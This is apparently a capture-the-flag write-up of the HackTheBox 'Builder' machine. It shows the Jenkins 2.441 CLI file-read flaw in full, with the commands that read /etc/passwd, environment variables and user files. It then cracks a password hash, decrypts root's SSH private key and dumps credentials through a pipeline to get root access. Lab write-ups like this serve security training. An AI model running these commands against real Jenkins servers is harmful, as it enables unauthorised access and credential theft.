---
title: Builder
tags:
  - HackTheBox
  - Medium
  - Linux
  - Jenkins
  - Brute-Forcing
date: 2024-09-07T00:00:00Z
---
![](Pasted%20image%2020241107150146.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.10 builder.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- builder.htb > sC.txt

[redacted]
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
8080/tcp open  http-proxy
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Dashboard [Jenkins]
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
```

It seems that there is a Jenkins v2.441 running on port 8080 on the machine:

![](Pasted%20image%2020241107150750.png)

There are two users connected: `anonymous` (which I suppose is me) and `jennifer`:

![](Pasted%20image%2020241107150648.png)

## Weaponization

I searched for "*Jenkins 2.441 cve*" in google and found [Jankins Security Advisory 2024-01-24](https://www.jenkins.io/security/advisory/2024-01-24/).

## Exploitation

Jenkins has a built-in [command line interface (CLI)](https://www.jenkins.io/doc/book/managing/cli/) to access Jenkins from a script or shell environment. We can download this cli from `http://builder.htb:8080/jnlpJars/jenkins-cli.jar`:

```shell
# Download the client
wget http://builder.htb:8080/jnlpJars/jenkins-cli.jar

# Test if it's vulnerable
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://builder.htb:8080' help '@/etc/passwd'

[redacted]
ERROR: Too many arguments: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
java -jar jenkins-cli.jar help [COMMAND]
Lists all the available commands or a detailed description of single command.
 COMMAND : Name of the command (default: root:x:0:0:root:/root:/bin/bash)
```

It seems to be vulnerable!

Now we can enumerate the Jenkins installation environment:

```shell
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://builder.htb:8080' help '@/proc/self/environ'

[redacted]
ERROR: No such command HOSTNAME=0f52c222a4ccJENKINS_UC_EXPERIMENTAL=https://updates.jenkins.io/experimentalJAVA_HOME=/opt/java/openjdkJENKINS_INCREMENTALS_REPO_MIRROR=https://repo.jenkins-ci.org/incrementalsCOPY_REFERENCE_FILE_LOG=/var/jenkins_home/copy_reference_file.logPWD=/JENKINS_SLAVE_AGENT_PORT=50000JENKINS_VERSION=2.441HOME=/var/jenkins_homeLANG=C.UTF-8JENKINS_UC=https://updates.jenkins.ioSHLVL=0JENKINS_HOME=/var/jenkins_homeREF=/usr/share/jenkins/refPATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin. Available commands are above. 
```

So we now know that the `HOME` folder is `/var/jenkins_home`, so we can get user flag like:

```shell
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://builder.htb:8080' help '@/var/jenkins_home/user.txt'
```

![](Pasted%20image%2020241107162226.png)

> Jenkins stores the initial admin password inside `/var/jenkins_home/secrets/initialAdminPassword`. But in this case it didn't work :(
> - [Source](https://boozallen.github.io/sdp-docs/learning-labs/1/local-development/3-configure-jenkins.html)

> Jenkins also stores users information inside `/var/jenkins_home/users/users.xml`
> - [Source](https://dev.to/pencillr/spawn-a-jenkins-from-code-gfa)

So I executed the following:

```shell
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://builder.htb:8080' reload-job '@/var/jenkins_home/users/users.xml'

[redacted]
<?xml version='1.1' encoding='UTF-8'?>: No such item ‘<?xml version='1.1' encoding='UTF-8'?>’ exists.
      <string>jennifer_12108429903186576833</string>: No such item ‘      <string>jennifer_12108429903186576833</string>’ exists.
  <idToDirectoryNameMap class="concurrent-hash-map">: No such item ‘  <idToDirectoryNameMap class="concurrent-hash-map">’ exists.
    <entry>: No such item ‘    <entry>’ exists.
      <string>jennifer</string>: No such item ‘      <string>jennifer</string>’ exists.
  <version>1</version>: No such item ‘  <version>1</version>’ exists.
</hudson.model.UserIdMapper>: No such item ‘</hudson.model.UserIdMapper>’ exists.
  </idToDirectoryNameMap>: No such item ‘  </idToDirectoryNameMap>’ exists.
<hudson.model.UserIdMapper>: No such item ‘<hudson.model.UserIdMapper>’ exists.
    </entry>: No such item ‘    </entry>’ exists.
```

So we can see a user `jennifer_12108429903186576833` that seems to be the initial `jennifer`. We can now inspect its personal config:

```shell
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://builder.htb:8080' reload-job '@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml'

[redacted]
<?xml version='1.1' encoding='UTF-8'?>: No such item ‘<?xml version='1.1' encoding='UTF-8'?>’ exists.
  <fullName>jennifer</fullName>: No such item ‘  <fullName>jennifer</fullName>’ exists.
      <seed>6841d11dc1de101d</seed>: No such item ‘      <seed>6841d11dc1de101d</seed>’ exists.
  <id>jennifer</id>: No such item ‘  <id>jennifer</id>’ exists.
  <version>10</version>: No such item ‘  <version>10</version>’ exists.
      <tokenStore>: No such item ‘      <tokenStore>’ exists.
          <filterExecutors>false</filterExecutors>: No such item ‘          <filterExecutors>false</filterExecutors>’ exists.
    <io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/>: No such item ‘    <io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/>’ exists.
      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>: No such item ‘      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>’ exists.
```

So here we've got some hashed creds: `$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a`.

It's time to use hashcat to decrypt this **bcrypt** formatted password:

```shell
hashcat -m 3200 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt

$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a:princess
```

> We've got credentials: `jennifer:princess`

We now can log in as `jennifer`:

![](Pasted%20image%2020241107164013.png)


If we now go to `Dashboard` >> `Manage Jenkins` >> `Credentials` and click on root:

![](Pasted%20image%2020241107164205.png)

We now have an update option to create a private key to access via ssh:

![](Pasted%20image%2020241107164328.png)

If we inspect the updating page, we can see a hidden input which contains the base64 encoded private key of the user root:

![](Pasted%20image%2020241107164610.png)

So we can decrypt it using the Jenkins Script Console `Manage Jenkins` >> `Script Console`:

```shell
println(hudson.util.Secret.decrypt('{<THE_KEY>}'))
```

![](Pasted%20image%2020241107165045.png)

> We now get root's private key :D and can read root flag

```shell
# Create id_rsa file
chmod 600 id_rsa
ssh -i id_rsa root@builder.htb
```

![](Pasted%20image%2020241107165338.png)

==Machine pwned!==

### Alternative solving version 1 (Via Pipeline SSH)

> Credits to [0xdf](https://0xdf.gitlab.io/2024/02/12/htb-builder.html)

Instead of using the Script Console to decrypt the encoded private key, we can use `Pipeline SSH`

First, we create a job:

![](Pasted%20image%2020241107165503.png)

On the next page, I’ll give it a name and select Pipeline:

![](Pasted%20image%2020241107165545.png)

On the next screen, I’ll define the pipeline. I can leave most of it as is, and just fill in the “Pipeline script”. The “try sample pipeline” button will offer a starting format.

```java
pipeline {
    agent any

    stages {
        stage('Hello') {
            steps {
                echo 'Hello World'
            }
        }
    }
}
```

If I save this and go back to the job page and click “Build Now”, the job runs. In the “Console Output” of the result, it shows the print:

![](Pasted%20image%2020241107165621.png)

[These docs](https://www.jenkins.io/doc/pipeline/steps/ssh-agent/) show how to use the SSH Agent plugin. I’ll paste in their POC as the pipeline:

```java
node {
  sshagent (credentials: ['deploy-dev']) {
    sh 'ssh -o StrictHostKeyChecking=no -l cloudbees 192.168.1.106 uname -a'
  }
}
```

I clearly need to change the IP. I’ll also need to change the “credential”. The docs show that it takes a list of strings. Trying with “root” fails:

![](Pasted%20image%2020241107165655.png)

Looking at the credential, it seems the ID is actually just "1":

![](Pasted%20image%2020241107165712.png)

I’ll update to that:

![](Pasted%20image%2020241107165724.png)

And it works:

![](Pasted%20image%2020241107165737.png)

I’ve successfully run commands on the host.

I’ll update the command from `uname -a` to `find /root`. In this build, it returns a full read of all the files in `/root`:

![](Pasted%20image%2020241107165754.png)

I could read `root.txt`, but I’ll grab that SSH private key instead, changing the command to `cat /root/.ssh/id_rsa`:

![](Pasted%20image%2020241107165808.png)

It’s the same key as the previous method.

### Alternative solving version 2 (Via Pipeline Dump Credentials)

If the pipeline can use the SSH key to get on to the host system as root, then it has access to the SSH key itself (I’ve already shown it can decrypt it). [This post](https://www.codurance.com/publications/2019/05/30/accessing-and-dumping-jenkins-credentials) talks about dumping credentials. There’s a good bit in the post about how to get it to print the credential unmasked. With a bunch of attempts and troubleshooting, I end up with:

![](Pasted%20image%2020241107165914.png)

When I run that, it prints the SSH key.

![](Pasted%20image%2020241107165922.png)

Now the procedure is the same as my way.

